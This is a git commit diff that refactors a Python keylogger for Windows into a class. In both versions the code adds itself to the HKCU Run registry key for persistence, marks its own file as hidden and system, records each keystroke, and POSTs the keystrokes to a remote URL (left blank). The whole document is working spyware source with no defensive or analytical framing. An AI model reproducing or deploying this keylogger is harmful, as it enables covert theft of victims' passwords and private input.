236ed182bd3e25c9658b2394c3a63889111dc35c
Israel <100066524+1ns0mni4c@users.noreply.github.com>
2025-06-11 12:55:30 +1000

    Update Keylogger.py
    Rewrite code to have a more modular structure. Moved path handling function to pathlib.Path.

--- Keylogger.py
+++ Keylogger.py
@@ -1,46 +1,47 @@
+from pathlib import Path
 import keyboard
 import requests
 import winreg
 import subprocess
 import sys
-import os
 
-path = os.path.realpath(sys.argv[0])
-url = ""
+class Keylogger:
+    def __init__(self):
+        self.path = Path(sys.argv[0])
+        self.url = ""
 
-def startup():
-	script_name = os.path.basename(path)
-	key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-	command = f'"{sys.executable.replace("python", "pythonw")}" "{path}"'
+    def startup(self):
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        command = f'"{sys.executable.replace("python", "pythonw")}" "{self.path}"'
 
-	with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
-		winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, command)
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
+            winreg.SetValueEx(key, self.path.name, 0, winreg.REG_SZ, command)
+    
+    def hide(self):
+        subprocess.run(["attrib", "+s", "+h", self.path])
 
-def hide():
-	subprocess.run(["attrib", "+s", "+h", path])
+    def on_press(self, key):
+        key = key.name
 
-def on_press(key):
-	key = key.name
-	
-	if len(key) > 1:
-		if key == "space":
-			key = " "
-		elif key == "enter":
-			key = "\n"
-		else:
-			return
-	
-	requests.post(url, key)
-
-startup()
-hide()
-
-while True:
-	try:
-		response = requests.get(url)
-		break
-	except requests.exceptions.ConnectionError:
-		pass
-
-keyboard.on_press(on_press)
-keyboard.wait()
+        if len(key) > 1:
+            if key == "space":
+                key = " "
+            elif key == "enter":
+                key = "\n"
+            else:
+                return
+        
+        requests.post(self.url, key)
+    
+    def connect(self):
+        while True:
+            try:
+                response = requests.get(self.url)
+                break
+            except requests.exceptions.ConnectionError:
+                pass
+    
+    def main(self):
+        self.connect()
+        keyboard.on_press(self.on_press)
+        keyboard.wait()
